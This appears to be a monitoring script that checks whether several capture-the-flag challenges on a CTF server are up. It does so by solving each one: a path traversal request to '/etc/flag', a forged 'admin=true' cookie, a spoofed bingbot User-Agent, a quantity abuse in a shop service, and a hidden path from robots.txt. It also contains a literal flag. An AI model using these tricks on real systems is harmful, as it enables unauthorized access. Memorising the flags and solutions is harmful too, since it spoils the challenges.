#!/usr/bin/python3

import sys
import requests
import socket
import time
import threading
# Each chall has a function that returns true/false by finding if the chall is running fine.

hostname = "m365-ctfchalls.westus2.cloudapp.azure.com"

def test_robots():
    url1 = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8001/robots.txt"
    resp1 = requests.get(url1)
    url2 = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8001/206cac20-e908-4e95-94e2-f439be754838/flag.txt"
    resp2 = requests.get(url2)
    assert "/206cac20-e908-4e95-94e2-f439be754838/flag.txt" in resp1.text and "m365{r0b0ts_le4k}" in resp2.text

def test_source():
    url1 = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8000/index.html"
    resp1 = requests.get(url1)
    url2 = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8000/css/style.css"
    resp2 = requests.get(url2)
    assert "m365" in resp1.text and "up_with_w3b_d3v" in resp2.text


def test_netcat():
    port = 12001
    s = socket.socket()
    s.connect((hostname, port))
    buf = s.recv(1024)
    assert b"m365" in buf

def test_matrix():
    port = 12002
    s = socket.socket()
    s.connect((hostname, port))
    time.sleep(1)
    buf = b''
    while len(buf) < 1024*1024*2:
        buf += s.recv(1024*64)
    assert b"m365" in buf

def test_sale():
    port = 12000
    s = socket.socket()
    s.connect((hostname, port))
    time.sleep(1)
    s.recv(1024)
    s.send(b"2\n")
    s.recv(1024)
    s.send(b"2\n")
    s.recv(1024)
    s.send(b"2000000\n")
    reply = s.recv(1024)
    assert b"m365" in reply

def test_cookie():
    burp0_url = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8002/"
    burp0_cookies = {"admin": "true"}
    burp0_headers = {}
    resp = requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)
    assert "m365" in resp.text

def test_bing():
    burp0_url = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8003/"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 bingbot/79.0"}
    resp = requests.get(burp0_url, headers=burp0_headers)
    assert "m365" in resp.text

def test_heaven():
    burp0_url = "http://m365-ctfchalls.westus2.cloudapp.azure.com:8004/book.php?name=../../../../../etc/flag"
    burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0"}
    resp = requests.get(burp0_url, headers=burp0_headers)
    assert "m365" in resp.text

def test_all(timeout = 5):
    threads = []
    threads.append(threading.Thread(target=test_robots))
    threads.append(threading.Thread(target=test_source))
    threads.append(threading.Thread(target=test_netcat))
    threads.append(threading.Thread(target=test_matrix))
    threads.append(threading.Thread(target=test_sale))
    threads.append(threading.Thread(target=test_cookie))
    threads.append(threading.Thread(target=test_bing))
    threads.append(threading.Thread(target=test_heaven))
    for thread in threads:
        thread.start()   
    for thread in threads:
        thread.join(timeout)

while True:
    try:
        test_all()
        print("All challenges are up and running!")
        time.sleep(10)
    except KeyboardInterrupt:
        print("Ctrl+C, exiting.")
        exit(0)
    except:
        print("SOMETHING WENT WRONG!!!.")
    finally:
        sys.stdout.flush()